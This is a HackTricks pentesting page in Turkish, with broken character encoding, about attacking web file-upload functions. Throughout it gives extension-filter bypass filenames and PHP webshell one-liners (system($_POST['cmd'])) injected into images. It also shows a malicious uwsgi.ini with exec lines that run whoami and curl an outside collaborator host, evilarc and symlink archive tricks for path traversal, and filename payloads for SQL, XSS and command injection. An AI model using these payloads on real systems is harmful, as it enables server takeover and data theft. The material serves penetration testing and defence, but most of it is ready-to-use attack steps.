# Dosya YÃ¼kleme

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olana kadar AWS hacklemeyi Ã¶ÄŸrenin!</summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Discord** ğŸ’¬ [**grubumuza katÄ±lÄ±n**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek HackTricks ve HackTricks Cloud** github depolarÄ±na PR'lar gÃ¶ndererek paylaÅŸÄ±n.

</details>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

EÄŸer **hacking kariyeri**ne ilgi duyuyorsanÄ±z ve hacklenemez olanÄ± hacklemek istiyorsanÄ±z - **iÅŸe alÄ±yoruz!** (_akÄ±cÄ± ÅŸekilde LehÃ§e yazÄ±lÄ± ve konuÅŸulmasÄ± gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

## Dosya YÃ¼kleme Genel Metodolojisi

DiÄŸer kullanÄ±ÅŸlÄ± uzantÄ±lar:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **PHPv8'de Ã‡alÄ±ÅŸma**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Sunucusu**: _.yaws_

### Dosya uzantÄ±larÄ± kontrolÃ¼nÃ¼ atlatma

1. EÄŸer varsa, **Ã¶nceki uzantÄ±larÄ± kontrol edin.** AyrÄ±ca onlarÄ± bazÄ± **bÃ¼yÃ¼k harflerle** deneyin: _pHp, .pHP5, .PhAr ..._
2. _Ã‡alÄ±ÅŸtÄ±rma uzantÄ±sÄ±ndan Ã¶nce **geÃ§erli bir uzantÄ± ekleyin** (Ã¶nceki uzantÄ±larÄ± da kullanÄ±n):_
* _file.png.php_
* _file.png.Php5_
3. **Sonuna Ã¶zel karakterler eklemeyi deneyin.** Burp'u kullanarak tÃ¼m **ascii** ve **Unicode** karakterlerini **bruteforce** etmeyi deneyebilirsiniz. (_Not: AyrÄ±ca **Ã¶nceki** bahsedilen **uzantÄ±larÄ±** da deneyebilirsiniz_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. Sunucu tarafÄ±ndaki uzantÄ± ayrÄ±ÅŸtÄ±rÄ±cÄ±sÄ±nÄ± **yanÄ±ltarak korumalarÄ± atlamayÄ± deneyin**. **UzantÄ±yÄ± ikiye katlama** veya **uzantÄ±lar arasÄ±na gereksiz veri** (**null** baytlarÄ±) eklemek gibi tekniklerle. _Daha iyi bir payload hazÄ±rlamak iÃ§in **Ã¶nceki uzantÄ±larÄ±** da kullanabilirsiniz._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. Ã–nceki kontrolde **baÅŸka bir katman uzantÄ± ekleyin**:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. **GeÃ§erli uzantÄ±dan Ã¶nce exec uzantÄ±sÄ±nÄ± ekleyin** ve sunucunun yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ olmasÄ±nÄ± umun. (Apache yan yapÄ±landÄ±rmalarÄ±nÄ± sÃ¶mÃ¼rmek iÃ§in faydalÄ±dÄ±r, burada uzantÄ±sÄ± **.php** olan her ÅŸey, ancak **mutlaka** .php ile bitmeyen her ÅŸey kodu Ã§alÄ±ÅŸtÄ±racaktÄ±r):
* _Ã¶rn: file.php.png_
7. **Windows'ta NTFS alternatif veri akÄ±ÅŸÄ±nÄ± (ADS)** kullanÄ±n. Bu durumda, yasaklÄ± bir uzantÄ±dan Ã¶nce ve izin verilen bir uzantÄ±dan sonra iki nokta karakteri â€œ:â€ eklenir. SonuÃ§ olarak, sunucuda yasaklÄ± uzantÄ±lÄ± **boÅŸ bir dosya** oluÅŸturulur (Ã¶rn. â€œfile.asax:.jpgâ€). Bu dosya daha sonra kÄ±sa dosya adÄ±nÄ± kullanarak dÃ¼zenlenebilir. â€œ**::$data**â€ deseni ayrÄ±ca boÅŸ olmayan dosyalar oluÅŸturmak iÃ§in kullanÄ±labilir. Bu nedenle, bu desenin ardÄ±ndan bir nokta karakteri eklemek, daha fazla kÄ±sÄ±tlamayÄ± atlamak iÃ§in de yararlÄ± olabilir (Ã¶rn. â€œfile.asp::$data.â€)
8. Dosya adÄ± sÄ±nÄ±rlarÄ±nÄ± aÅŸmayÄ± deneyin. GeÃ§erli uzantÄ± kesilir ve kÃ¶tÃ¼ niyetli PHP bÄ±rakÄ±lÄ±r. AAA<--SNIP-->AAA.php

```
# Linux maksimum 255 bayt
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # burada 4 eksiltin ve .png ekleyin
# DosyayÄ± yÃ¼kleyin ve kaÃ§ karakter izin verdiÄŸini kontrol edin. Diyelim ki 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Payload'Ä± oluÅŸturun
AAA<--SNIP 232 A-->AAA.php.png
```
### Ä°Ã§erik TÃ¼rÃ¼, Sihirli SayÄ±, SÄ±kÄ±ÅŸtÄ±rma ve Yeniden BoyutlandÄ±rma Engelleme

* **Content-Type** kontrollerini atlayarak **Content-Type** **baÅŸlÄ±ÄŸÄ±nÄ±n deÄŸerini** ÅŸu ÅŸekilde ayarlayÄ±n: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* **Sihirli sayÄ±** kontrolÃ¼nÃ¼ atlayarak dosyanÄ±n baÅŸÄ±na **gerÃ§ek bir resmin baytlarÄ±nÄ±** ekleyerek (_file_ komutunu karÄ±ÅŸtÄ±rÄ±n). Veya **metadata** iÃ§ine **shell** ekleyin:\
`exiftool -Comment="<?php echo 'Komut:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` veya ayrÄ±ca bir resme **doÄŸrudan payload ekleyebilirsiniz**:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* EÄŸer resminize **sÄ±kÄ±ÅŸtÄ±rma ekleniyorsa**, Ã¶rneÄŸin [PHP-GD](https://www.php.net/manual/fr/book.image.php) gibi bazÄ± standart PHP kÃ¼tÃ¼phanelerini kullanarak, Ã¶nceki teknikler iÅŸe yaramayabilir. Ancak, sÄ±kÄ±ÅŸtÄ±rmayÄ± **hayatta kalacak metin** eklemek iÃ§in **PLTE chunk** [**burada tanÄ±mlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanabilirsiniz.
* [**Kod ile Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* Web sayfasÄ± ayrÄ±ca resmi **yeniden boyutlandÄ±rarak** kullanÄ±yor olabilir, Ã¶rneÄŸin PHP-GD fonksiyonlarÄ± `imagecopyresized` veya `imagecopyresampled` kullanarak. Ancak, sÄ±kÄ±ÅŸtÄ±rmayÄ± **hayatta kalacak metin** eklemek iÃ§in **IDAT chunk** [**burada tanÄ±mlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanabilirsiniz.
* [**Kod ile Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* Bir baÅŸka teknik, bir payload oluÅŸturmak iÃ§in **resmi yeniden boyutlandÄ±rma** iÅŸleminden sonra hayatta kalacak metin eklemek iÃ§in PHP-GD fonksiyonu `thumbnailImage` kullanmaktÄ±r. Ancak, sÄ±kÄ±ÅŸtÄ±rmayÄ± **hayatta kalacak metin** eklemek iÃ§in **tEXt chunk** [**burada tanÄ±mlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanabilirsiniz.
* [**Kod ile Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### DiÄŸer Ä°puÃ§larÄ±

* Zaten yÃ¼klenmiÅŸ olan dosyayÄ± **yeniden adlandÄ±rmak** iÃ§in bir zafiyet bulun.
* Geri kapÄ±yÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in **Yerel Dosya Dahil Etme** zafiyeti bul.
* **OlasÄ± Bilgi SÄ±zÄ±ntÄ±sÄ±**:
1. **AynÄ± dosyayÄ±** ve **aynÄ± ismi** **birkaÃ§ kez** (ve **aynÄ± anda**) yÃ¼kleyin
2. Zaten var olan bir **dosya** veya **dizin** adÄ±yla bir dosya yÃ¼kleyin
3. Ä°smini **â€œ.â€, â€œ..â€, veya â€œâ€¦â€** olarak belirtilen bir dosya yÃ¼kleyin. Ã–rneÄŸin, Apache'de **Windows**'ta, uygulama yÃ¼klenen dosyalarÄ± â€œ/www/uploads/â€ dizininde saklÄ±yorsa, â€œ.â€ dosya adÄ± â€œ/www/â€ dizininde â€œuploadsâ€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.
4. **NTFS**'de **â€œâ€¦:.jpgâ€** gibi kolayca silinmeyen bir dosya yÃ¼kleyin. (Windows)
5. Ä°sminde `|<>*?â€` gibi **geÃ§ersiz karakterler** bulunan bir dosya yÃ¼kleyin. (Windows)
6. **YasaklanmÄ±ÅŸ** (**yasaklanmÄ±ÅŸ**) **isimler** kullanarak bir dosya yÃ¼kleyin, Ã¶rneÄŸin CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 ve LPT9.
* AyrÄ±ca yanlÄ±ÅŸlÄ±kla aÃ§Ä±ldÄ±ÄŸÄ±nda kodu **Ã§alÄ±ÅŸtÄ±racak bir** (.exe) veya **.html** (daha az ÅŸÃ¼pheli) dosya yÃ¼klemeyi deneyin.

### Ã–zel UzantÄ± Ä°puÃ§larÄ±

EÄŸer dosyalarÄ± bir **PHP sunucusuna** yÃ¼klemeye Ã§alÄ±ÅŸÄ±yorsanÄ±z, [kodun **Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± saÄŸlamak iÃ§in** **.htaccess** hilesine bakÄ±n](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
EÄŸer dosyalarÄ± bir **ASP sunucusuna** yÃ¼klemeye Ã§alÄ±ÅŸÄ±yorsanÄ±z, [kodun **Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±nÄ± saÄŸlamak iÃ§in** **.config** hilesine bakÄ±n](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` dosyalarÄ± java iÃ§in `.jar` gibi, ancak php iÃ§in ve bir php dosyasÄ± gibi **kullanÄ±labilir** (php ile Ã§alÄ±ÅŸtÄ±rÄ±larak veya bir betik iÃ§ine dahil edilerek...)

`.inc` uzantÄ±sÄ± bazen yalnÄ±zca dosyalarÄ± **ithal etmek** iÃ§in kullanÄ±lan php dosyalarÄ± iÃ§in kullanÄ±lÄ±r, bu nedenle, bir noktada, birinin **bu uzantÄ±nÄ±n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±na izin vermiÅŸ olabileceÄŸini** dÃ¼ÅŸÃ¼nebilirsiniz.

## **Jetty RCE**

EÄŸer bir XML dosyasÄ±nÄ± Jetty sunucusuna yÃ¼kleyebilirseniz, [RCE elde edebilirsiniz Ã§Ã¼nkÃ¼ **yeni \*.xml ve \*.war otomatik olarak iÅŸlenir**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Bu nedenle, aÅŸaÄŸÄ±daki resimde belirtildiÄŸi gibi, XML dosyasÄ±nÄ± `$JETTY_BASE/webapps/` dizinine yÃ¼kleyin ve kabuk bekleyin!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1) (3) (1) (1) (1).png>)

## **uWSGI RCE**

Bu zafiyetin detaylÄ± keÅŸfi iÃ§in orijinal araÅŸtÄ±rmaya gÃ¶z atÄ±n: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

UWSGI sunucularÄ±nda Uzaktan Komut YÃ¼rÃ¼tme (RCE) zafiyetleri, `.ini` yapÄ±landÄ±rma dosyasÄ±nÄ± deÄŸiÅŸtirme yeteneÄŸine sahip olanlar tarafÄ±ndan sÃ¶mÃ¼rÃ¼lebilir. UWSGI yapÄ±landÄ±rma dosyalarÄ±, "sihirli" deÄŸiÅŸkenleri, yer tutucularÄ± ve operatÃ¶rleri iÃ§eren belirli bir sÃ¶zdizim kullanÄ±r. Ã–zellikle, `@(filename)` olarak kullanÄ±lan '@' operatÃ¶rÃ¼, bir dosyanÄ±n iÃ§eriÄŸini dahil etmek iÃ§in tasarlanmÄ±ÅŸtÄ±r. UWSGI'de desteklenen Ã§eÅŸitli ÅŸemalardan biri olan "exec" ÅŸemasÄ± Ã¶zellikle gÃ¼Ã§lÃ¼dÃ¼r, bir iÅŸlemin standart Ã§Ä±ktÄ±sÄ±ndan veri okumayÄ± saÄŸlar. Bu Ã¶zellik, bir `.ini` yapÄ±landÄ±rma dosyasÄ± iÅŸlendiÄŸinde Uzaktan Komut YÃ¼rÃ¼tme veya Keyfi Dosya Yazma/Okuma gibi kÃ¶tÃ¼ amaÃ§lar iÃ§in manipÃ¼le edilebilir.

AÅŸaÄŸÄ±daki zararlÄ± `uwsgi.ini` dosyasÄ± Ã¶rneÄŸini dÃ¼ÅŸÃ¼nÃ¼n, Ã§eÅŸitli ÅŸemalarÄ± gÃ¶stermektedir:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Payload'Ä±n yÃ¼rÃ¼tÃ¼lmesi, yapÄ±landÄ±rma dosyasÄ±nÄ±n ayrÄ±ÅŸtÄ±rÄ±lmasÄ± sÄ±rasÄ±nda gerÃ§ekleÅŸir. YapÄ±landÄ±rmanÄ±n etkinleÅŸtirilmesi ve ayrÄ±ÅŸtÄ±rÄ±lmasÄ± iÃ§in uWSGI iÅŸlemi ya yeniden baÅŸlatÄ±lmalÄ±dÄ±r (potansiyel olarak bir Ã§Ã¶kme sonrasÄ± veya Bir Hizmet Reddi saldÄ±rÄ±sÄ±ndan dolayÄ±) ya da dosya otomatik yeniden yÃ¼kleme olarak ayarlanmalÄ±dÄ±r. EtkinleÅŸtirilmiÅŸse, otomatik yeniden yÃ¼kleme Ã¶zelliÄŸi, deÄŸiÅŸiklikler algÄ±landÄ±ÄŸÄ±nda belirtilen aralÄ±klarda dosyayÄ± yeniden yÃ¼kler.

uWSGI'nin yapÄ±landÄ±rma dosyasÄ± ayrÄ±ÅŸtÄ±rmasÄ±nÄ±n gevÅŸek doÄŸasÄ±nÄ± anlamak son derece Ã¶nemlidir. Ã–zellikle, tartÄ±ÅŸÄ±lan payload, bir ikili dosyaya (Ã¶rneÄŸin bir resim veya PDF) yerleÅŸtirilebilir, potansiyel sÃ¶mÃ¼rÃ¼ alanÄ±nÄ± daha da geniÅŸletir.

## **wget Dosya YÃ¼kleme/SSRF Hilesi**

BazÄ± durumlarda, bir sunucunun **`wget`** kullanarak **dosyalarÄ± indirdiÄŸini** ve **URL**'yi **belirtebileceÄŸinizi** fark edebilirsiniz. Bu durumlarda, kodun indirilen dosyalarÄ±n uzantÄ±sÄ±nÄ±n bir beyaz listeye dahil olduÄŸunu kontrol edebileceÄŸini ve yalnÄ±zca izin verilen dosyalarÄ±n indirileceÄŸini saÄŸlamak iÃ§in. Ancak, **bu kontrol atlatÄ±labilir.**\
**Linux**'taki bir **dosya adÄ±nÄ±n** maksimum uzunluÄŸu **255** karakterdir, ancak **wget** dosya adlarÄ±nÄ± **236** karaktere kÄ±saltÄ±r. **"A"\*232+".php"+".gif"** adÄ±nda bir dosya indirebilirsiniz, bu dosya adÄ± **kontrolÃ¼ atlayacaktÄ±r** (bu Ã¶rnekte **".gif"** geÃ§erli bir uzantÄ±dÄ±r) ancak `wget` dosyayÄ± **"A"\*232+".php"** olarak yeniden adlandÄ±racaktÄ±r.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™ saved [10/10]
```
**BaÅŸka bir seÃ§enek** olarak dÃ¼ÅŸÃ¼nebileceÄŸiniz ÅŸey, bu kontrolÃ¼ atlatmanÄ±n bir yolu olarak **HTTP sunucusunu farklÄ± bir dosyaya yÃ¶nlendirmesini saÄŸlamaktÄ±r**, bÃ¶ylece baÅŸlangÄ±Ã§taki URL, wget o zaman yÃ¶nlendirilen dosyayÄ± yeni adÄ±yla indireceÄŸi iÃ§in kontrolÃ¼ atlatÄ±r. Bu, wget'in `--trust-server-names` **parametresiyle kullanÄ±lmadÄ±ÄŸÄ± sÃ¼rece Ã§alÄ±ÅŸmayacaktÄ±r**, Ã§Ã¼nkÃ¼ **wget yÃ¶nlendirilen sayfayÄ± orijinal URL'de belirtilen dosya adÄ±yla indirecektir**.

## AraÃ§lar

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass), Pentesterlara ve Hata AvcÄ±larÄ±na dosya yÃ¼kleme mekanizmalarÄ±nÄ± test etmede yardÄ±mcÄ± olmak iÃ§in tasarlanmÄ±ÅŸ gÃ¼Ã§lÃ¼ bir araÃ§tÄ±r. Ã‡eÅŸitli hata avÄ± tekniklerinden yararlanarak web uygulamalarÄ±nÄ±n kapsamlÄ± deÄŸerlendirmelerini saÄŸlayarak zayÄ±flÄ±klarÄ± belirleme ve sÃ¶mÃ¼rme sÃ¼recini basitleÅŸtirir.

## Dosya yÃ¼klemeden diÄŸer zayÄ±flÄ±klara

* **Dosya adÄ±nÄ±** `../../../tmp/lol.png` olarak ayarlayÄ±n ve bir **yol geÃ§iÅŸi** elde etmeye Ã§alÄ±ÅŸÄ±n
* **Dosya adÄ±nÄ±** `sleep(10)-- -.jpg` olarak ayarlayÄ±n ve bir **SQL enjeksiyonu** elde etme olasÄ±lÄ±ÄŸÄ±nÄ±z olabilir
* **Dosya adÄ±nÄ±** `<svg onload=alert(document.domain)>` olarak ayarlayarak bir XSS elde edin
* **Dosya adÄ±nÄ±** `; sleep 10;` olarak ayarlayarak bazÄ± komut enjeksiyonlarÄ±nÄ± test edin (daha fazla [komut enjeksiyonu hilesi burada](../command-injection.md))
* [**Resim (svg) dosyasÄ±nda XSS**](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** dosyasÄ± **yÃ¼kleme** + **XSS** = [**Service Workers** kÃ¶tÃ¼ye kullanÄ±mÄ±](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**SVG yÃ¼klemede XXE**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [SVG dosyasÄ± yÃ¼kleyerek **AÃ§Ä±k YÃ¶nlendirme**](../open-redirect.md#open-redirect-uploading-svg-files)
* [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet) adresinden **farklÄ± svg payloadlarÄ±** deneyin
* ÃœnlÃ¼ **ImageTrick** zayÄ±flÄ±ÄŸÄ±
* Web sunucusunu bir URL'den bir resmi yakalamaya iÅŸaret edebilirseniz, bir [SSRF'yi](../ssrf-server-side-request-forgery/) kÃ¶tÃ¼ye kullanmaya Ã§alÄ±ÅŸabilirsiniz. Bu **resim**in bazÄ± **genel** bir siteye **kaydedilecek** olmasÄ± durumunda, [https://iplogger.org/invisible/](https://iplogger.org/invisible/) adresinden bir URL belirtebilir ve her ziyaretÃ§inin bilgilerini **Ã§alabilirsiniz**.
* [PDF-Adobe yÃ¼kleme ile **XXE ve CORS** atlatma](pdf-upload-xxe-and-cors-bypass.md)
* XSS iÃ§in Ã¶zel olarak oluÅŸturulmuÅŸ PDF'ler: [AÅŸaÄŸÄ±daki sayfa, JS yÃ¼rÃ¼tme elde etmek iÃ§in PDF verilerini nasÄ±l enjekte edeceÄŸinizi](../xss-cross-site-scripting/pdf-injection.md) gÃ¶stermektedir. PDF'ler yÃ¼kleyebiliyorsanÄ±z, verilen talimatlarÄ± takip ederek keyfi JS yÃ¼rÃ¼tebilecek bir PDF hazÄ±rlayabilirsiniz.
* Sunucunun herhangi bir **antivirÃ¼s** programÄ±na sahip olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) iÃ§eriÄŸini yÃ¼kleyin
* Dosya yÃ¼kleme sÄ±rasÄ±nda herhangi bir **boyut sÄ±nÄ±rÄ±** olup olmadÄ±ÄŸÄ±nÄ± kontrol edin

Ä°ÅŸte yÃ¼kleme yaparak elde edebileceÄŸiniz ÅŸeylerin en iyi 10 listesi ([buradan](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: DepolanmÄ±ÅŸ XSS / SSRF / XXE
3. **GIF**: DepolanmÄ±ÅŸ XSS / SSRF
4. **CSV**: CSV enjeksiyonu
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML enjeksiyonu / XSS / AÃ§Ä±k yÃ¶nlendirme
8. **PNG / JPEG**: Piksel seli saldÄ±rÄ±sÄ± (DoS)
9. **ZIP**: LFI aracÄ±lÄ±ÄŸÄ±yla RCE / DoS
10. **PDF / PPTX**: SSRF / KÃ¶r XXE

#### Burp Eklentisi

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Sihirli BaÅŸlÄ±k BaytlarÄ±

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

DiÄŸer dosya tÃ¼rleri iÃ§in [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) adresine baÅŸvurun.

### Zip/Tar DosyasÄ± Otomatik Olarak SÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ YÃ¼kleme

Sunucu iÃ§inde sÄ±kÄ±ÅŸtÄ±rÄ±lacak bir ZIP yÃ¼kleyebiliyorsanÄ±z, 2 ÅŸey yapabilirsiniz:

#### Sembolik baÄŸ

DiÄŸer dosyalara yumuÅŸak baÄŸlantÄ±lar iÃ§eren bir baÄŸlantÄ± yÃ¼kleyin, ardÄ±ndan, sÄ±kÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ dosyalara eriÅŸerek baÄŸlÄ± dosyalara eriÅŸeceksiniz:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### FarklÄ± klasÃ¶rlerde aÃ§ma

SÄ±kÄ±ÅŸtÄ±rma sÄ±rasÄ±nda dosyalarÄ±n beklenmedik bir ÅŸekilde dizinlerde oluÅŸturulmasÄ± ciddi bir sorundur. Ä°lk baÅŸta bu yapÄ±landÄ±rmanÄ±n kÃ¶tÃ¼ niyetli dosya yÃ¼klemeleri aracÄ±lÄ±ÄŸÄ±yla OS dÃ¼zeyinde komut yÃ¼rÃ¼tme karÅŸÄ±sÄ±nda koruma saÄŸlayabileceÄŸi varsayÄ±lsa da, ZIP arÅŸiv formatÄ±nÄ±n hiyerarÅŸik sÄ±kÄ±ÅŸtÄ±rma desteÄŸi ve dizin geÃ§iÅŸi yetenekleri istismar edilebilir. Bu, saldÄ±rganlarÄ±n hedef uygulamanÄ±n aÃ§ma iÅŸlevselliÄŸini manipÃ¼le ederek kÄ±sÄ±tlamalarÄ± atlamasÄ±na ve gÃ¼venli yÃ¼kleme dizinlerinden kaÃ§masÄ±na olanak tanÄ±r.

Bu tÃ¼r dosyalarÄ± oluÅŸturmak iÃ§in otomatik bir saldÄ±rÄ± aracÄ± [**GitHub'daki evilarc**](https://github.com/ptoomey3/evilarc) adresinde mevcuttur. YardÄ±mcÄ± program ÅŸu ÅŸekilde kullanÄ±labilir:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
